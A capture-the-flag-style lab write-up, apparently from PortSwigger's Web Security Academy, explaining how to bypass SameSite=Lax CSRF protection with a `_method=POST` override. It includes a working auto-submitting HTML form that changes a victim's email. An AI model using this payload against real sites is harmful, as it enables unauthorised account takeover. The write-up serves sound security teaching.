

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: `wiener:peter`

#### Note

The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

-----------------


# Solution

The site uses SameSite=Lax cookies, which blocks cross-site POST requests from sending cookies. But the framework supports the `_method` parameter, which lets you override the HTTP method server-side.

The form sends a GET request (which Lax allows cookies get sent because it’s a top-level navigation). But inside the parameters, `_method=POST` tells the framework to treat it as a POST internally. So the browser sees GET (sends cookies), the server sees POST (processes the email change).

It’s a mismatch between what the browser enforces and what the server processes. The browser’s SameSite check looks at the actual HTTP method (GET — allowed). The server’s routing looks at `_method` (POST executes the state-changing action). Neither system talks to the other, and the attacker slips through the gap.



```
<html>
<body>

<form action="https://0a4a007a041c75f48079f8d100d700da.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net" />
</form>

<script>
      document.forms[0].submit();
    </script>
</html>
</body>
```


Takeaway: when testing for CSRF on a Lax-protected site, always try `_method=POST` in a GET request. Frameworks like Symfony, Laravel, and Rails support method overrides by default.